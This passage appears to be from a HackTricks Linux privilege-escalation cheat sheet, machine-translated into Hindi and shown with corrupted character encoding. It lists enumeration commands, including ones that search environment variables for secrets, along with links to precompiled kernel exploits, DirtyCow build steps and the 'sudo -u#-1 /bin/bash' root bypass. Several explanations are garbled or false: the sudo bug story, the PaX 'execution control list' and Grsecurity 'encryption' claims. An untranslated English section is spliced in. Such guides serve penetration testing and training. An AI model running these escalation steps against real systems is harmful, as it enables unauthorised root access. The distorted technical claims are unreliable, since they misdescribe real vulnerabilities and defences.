# рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## рд╕рд┐рд╕реНрдЯрдо рд╕реВрдЪрдирд╛

### рдУрдПрд╕ рд╕реВрдЪрдирд╛

рдЪрд▓реЛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рдУрдПрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬреНрдЮрд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### рдорд╛рд░реНрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ `PATH` рдЪрд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓реЗрдЦрди рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдХреБрдЫ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo $PATH
```
### рд╡рд╛рддрд╛рд╡рд░рдг рдЬрд╛рдирдХрд╛рд░реА

рдХреНрдпрд╛ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░реЛрдВ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА, рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ API рдХреБрдВрдЬреА рд╣реИрдВ?
```bash
(env || set) 2>/dev/null
```
### рдХрд░реНрдирд▓ рдЕрдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

рдХрд░реНрдирд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдпрджрд┐ рдХреЛрдИ рдРрд╕рд╛ рдЙрддреНрдкрд╛рдж рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдЬрд╛рдВрдЪреЗрдВред
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
рдЖрдк рдПрдХ рдЕрдЪреНрдЫреА рд░реВрдк рд╕реЗ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдХрд░реНрдгреЗрд▓ рд╕реВрдЪреА рдФрд░ рдХреБрдЫ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдЙрддреНрдкрд╛рджреЛрдВ** рдХреЛ рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) рдФрд░ [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)ред
рдЕрдиреНрдп рд╕рд╛рдЗрдЯреЗрдВ рдЬрд╣рд╛рдВ рдЖрдк рдХреБрдЫ **рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдЙрддреНрдкрд╛рдж** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

рдЙрд╕ рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рд╕рднреА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдХрд░реНрдгреЗрд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
рдЙрдкрдпреЛрдЧреА рдЙрдкрдХрд░рдг рдЬреЛ рдХрд░реНрдирд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХреА рдЦреЛрдЬ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╣реИрдВ:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (рдХреЗрд╡рд▓ рдкреАрдбрд╝рд┐рдд рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдХрд░реНрдирд▓ 2.x рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ)

рд╣рдореЗрд╢рд╛ **Google рдореЗрдВ рдХрд░реНрдирд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ**, рд╢рд╛рдпрдж рдЖрдкрдХреЗ рдХрд░реНрдирд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЛрдИ рдХрд░реНрдирд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реЛ рдФрд░ рдлрд┐рд░ рдЖрдк рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрдВрдЧреЗ рдХрд┐ рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдорд╛рдиреНрдп рд╣реИ.

### CVE-2016-5195 (DirtyCow)

рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди - рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo рд╕рдВрд╕реНрдХрд░рдг

рдЬреЛ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ sudo рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИрдВ рд╡реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИрдВ:
```bash
searchsploit sudo
```
рдЖрдк рдЗрд╕ grep рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ sudo рд╕рдВрд╕реНрдХрд░рдг рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИред
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov рд╕реЗ

рдпрд╣ рдПрдХ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджреЗрд╣ рд╣реИ рдЬреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ sudo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ sudo рдХреА рд╕рдВрд╕реНрдХрд░рдг 1.28 рд╕реЗ рдкрд╣рд▓реЗ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рдЕрджреНрдпрддрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЗрд╕ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдкрд╣рд▓реЗ, sudo рдиреЗ рдПрдХ рдЕрджреНрдпрддрди рдХрд┐рдпрд╛ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдирд╛рдо рдХреЗ рд╕рд╛рде рдЕрдкрдиреЗ рдирд╛рдо рдХреЗ рдмрд╛рдж рдПрдХ рдЕрдВрддрд░рд┐рдХреНрд╖ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рдереЗред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдирд╛рдо рдХреЗ рдмрд╛рдж рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдирд╛рдореЛрдВ рдХреЛ рднреА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдкрдиреЗ рдирд╛рдо рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдЕрджреНрдпрддрди рдХреЗ рдкрд╣рд▓реЗ, рдПрдХ рдЕрджреНрдпрддрди рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ рдирд╛рдо рдХреЗ рдмрд╛рдж рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдирд╛рдореЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдВрддрд░рд┐рдХреНрд╖ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рдереЗред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо "admin" рд╣реИ рдФрд░ рдПрдХ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо "hacker" рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "admin hacker" рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рдерд╛ред

рдЗрд╕ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдХреЗ рдмрд╛рдж рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

рдЗрд╕ рд╕рдВрджрд░реНрдн рдореЗрдВ, рд╣рдо рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рддрд░реАрдХрд╛ рджреЗрдЦреЗрдВрдЧреЗ рдЬрд┐рд╕рд╕реЗ рд╣рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдХреЗ рдмрд╛рдж рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
```
sudo -u#-1 /bin/bash
```
### Dmesg рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рд╡рд┐рдлрд▓ рд╣реБрдЖ

рдЗрд╕ рдЦреЛрдЬ рдХреЗ рдПрдХ **рдЙрджрд╛рд╣рд░рдг** рдХреЗ рд▓рд┐рдП **HTB рдХреЗ smasher2 рдмреЙрдХреНрд╕** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
```bash
dmesg 2>/dev/null | grep "signature"
```
### рдЕрдзрд┐рдХ рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдВрдЪ

In addition to the basic system enumeration techniques mentioned earlier, there are several other methods that can be used to gather information about a target system. These techniques can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Process Enumeration

Process enumeration involves listing all the running processes on a system. This can be done using commands like `ps` or `top`. By analyzing the list of processes, you can identify any suspicious or unauthorized processes running on the system.

#### 2. Service Enumeration

Service enumeration involves identifying the services running on a system. This can be done using commands like `netstat` or `ss`. By analyzing the list of services, you can identify any unnecessary or vulnerable services that can be exploited.

#### 3. File and Directory Enumeration

File and directory enumeration involves listing the files and directories present on a system. This can be done using commands like `ls` or `find`. By analyzing the file and directory structure, you can identify any sensitive files or directories that can be accessed or modified.

#### 4. Network Enumeration

Network enumeration involves gathering information about the network configuration of a system. This can be done using commands like `ifconfig` or `ip`. By analyzing the network configuration, you can identify any open ports or network services that can be targeted.

#### 5. User Enumeration

User enumeration involves identifying the users present on a system. This can be done using commands like `cat /etc/passwd` or `getent passwd`. By analyzing the list of users, you can identify any privileged or misconfigured user accounts that can be exploited.

#### 6. Privilege Enumeration

Privilege enumeration involves identifying the privileges assigned to users or processes on a system. This can be done using commands like `sudo -l` or `getcap`. By analyzing the privileges, you can identify any misconfigurations or vulnerabilities that can be leveraged for privilege escalation.

By performing these additional system enumeration techniques, you can gather more information about the target system and increase your chances of finding vulnerabilities and privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### рд╡рд┐рднрд╛рдЬрди рдХреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity рдПрдХ рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ рдкреИрдЪ рд╣реИ рдЬреЛ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдкреИрдЪ рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдиреНрдирддрд┐рдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЬреЛ рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВред Grsecurity рдХреЗ рдХреБрдЫ рдореБрдЦреНрдп рдлреАрдЪрд░реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдЧреНрд░реЗрдб рдЕрджреНрдпрддрди: Grsecurity рдкреИрдЪ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрджреНрдпрддрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдирд╡реАрдирддрдо рд╕реБрд░рдХреНрд╖рд╛ рдЙрдиреНрдирддрд┐рдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
- рдкреНрд░реЛрдЯреЗрдХреНрд╢рди рдЕрдЧреЗрдВрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕: Grsecurity рдХрдИ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ, рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди, рдФрд░ рдХрд░реНрдирд▓ рд░реВрдЯрдХрд┐рдЯреНрд╕ред
- рд░реЛрд▓-рдЖрдзрд╛рд░рд┐рдд рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓: Grsecurity рд░реЛрд▓-рдЖрдзрд╛рд░рд┐рдд рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдФрд░ рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕реАрдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдЧреНрд░реЗрдбреЗрдб рдкрд░рдорд┐рд╢рдиреНрд╕: Grsecurity рдЧреНрд░реЗрдбреЗрдб рдкрд░рдорд┐рд╢рдиреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдирд┐рд╢реНрдЪрд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕реАрдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди: Grsecurity рдбрд┐рд╕реНрдХ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреА рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдбреЗрдЯрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддреА рд╣реИред

Grsecurity рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдЕрдкрдиреЗ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВред
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### рдкреИрдХреНрд╕

PaX (рдкреНрд░реЛрдЯреЗрдХреНрд╢рди рдПрдХреНрд╕реЗрдХреНрдпреВрд╢рди) рдПрдХ рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ рдкреИрдЪ рд╣реИ рдЬреЛ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХрдВрдЯреНрд░реЛрд▓ рд▓рд┐рд╕реНрдЯ (ECL) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддрд╛ рд╣реИред ECL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдкреИрдХреНрд╕ рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ рдореЗрдВ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХрдВрдЯреНрд░реЛрд▓ рдирд┐рдпрдВрддреНрд░рдг рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЬреЛ рдЕрдирдзрд┐рдХреГрдд рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рдкреНрд░рднрд╛рд╡реА рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЛ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред

рдпрд╣ рдкреИрдЪ рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдЯреЗрдХреНрдирд┐рдХреНрд╕ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдмрдлрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ, рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рд╡рд┐рдзрд┐ рдУрд╡рд░рд░рд╛рдЗрдб, рдФрд░ рдбреЗрдЯрд╛ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рдиред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдкреНрд░рд╢рд╛рд╕рдХ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЕрдирдзрд┐рдХреГрдд рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХреЛ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдкреИрдЪ рд▓рд┐рдирдХреНрд╕ рдХрд░реНрдирд▓ рдХреЛ рд╣рд╛рд░реНрдбрди рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрд░реАрдХрд╛ рд╣реИ рдФрд░ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдХрдВрдЯреНрд░реЛрд▓ рдХреА рдПрдХ рдкреНрд░рдореБрдЦ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рд╣реИрдХрд░реНрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдордЬрдмреВрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### рдПрдХреНрдЬреАрдХреНрдпреВрд╢реАрд▓реНрдб

